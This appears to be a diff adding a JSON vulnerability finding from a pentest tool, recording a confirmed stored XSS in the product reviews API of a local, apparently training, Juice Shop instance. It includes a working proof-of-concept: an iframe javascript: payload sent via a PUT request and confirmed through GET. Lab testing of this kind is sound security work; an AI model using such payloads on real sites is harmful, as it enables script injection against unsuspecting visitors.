@@ -1,0 +1,28 @@
+{
+  "id": "f_1784835663204_460b06",
+  "action": "confirm",
+  "title": "Stored XSS via Product Reviews API",
+  "severity": "high",
+  "finding_kind": "vuln",
+  "location": "PUT /rest/products/1/reviews",
+  "url": "PUT /rest/products/1/reviews",
+  "description": "The product reviews API accepts PUT requests with arbitrary HTML/JavaScript content in the message field. The payload `<iframe src=\"javascript:alert(`xss`)\"` was successfully stored and is returned when reading reviews via GET /rest/products/1/reviews. This is a stored XSS (persisted cross-site scripting) vulnerability that executes when a victim views the affected product page containing the review. The attack can be performed entirely via the API without using the frontend application.",
+  "poc": "PUT /rest/products/1/reviews with JSON body: {\"message\":\"<iframe src=\\\"javascript:alert(`xss`)\\\">\",\"author\":\"admin@juice-sh.op\"} → HTTP 200 {\"status\":\"success\"}\\nThen GET /rest/products/1/reviews → review contains unescaped iframe tag",
+  "proof": "XSS STORED! <iframe src=\"javascript:alert(`xss`)\"> — confirmed via GET /rest/products/1/reviews after PUT request with the XSS payload in the message field",
+  "how_captured": "shell: # Try the XSS in product reviews via different endpoints # The challenge says \"without using the frontend\" - so maybe PUT /rest/products/1/reviews works # Let m",
+  "evidence_ids": [
+    "ev_1784835663182_80851e"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784835663182_80851e",
+      "excerpt": "XSS STORED! <iframe src=\"javascript:alert(`xss`)\"> — confirmed via GET /rest/products/1/reviews after PUT request with the XSS payload in the message field",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "shell: # Try the XSS in product reviews via different endpoints # The challenge says \"without using the frontend\" - so maybe PUT /rest/products/1/reviews works # Let m"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3011",
+  "created_at": "2026-07-23T19:41:03.204Z"
+}
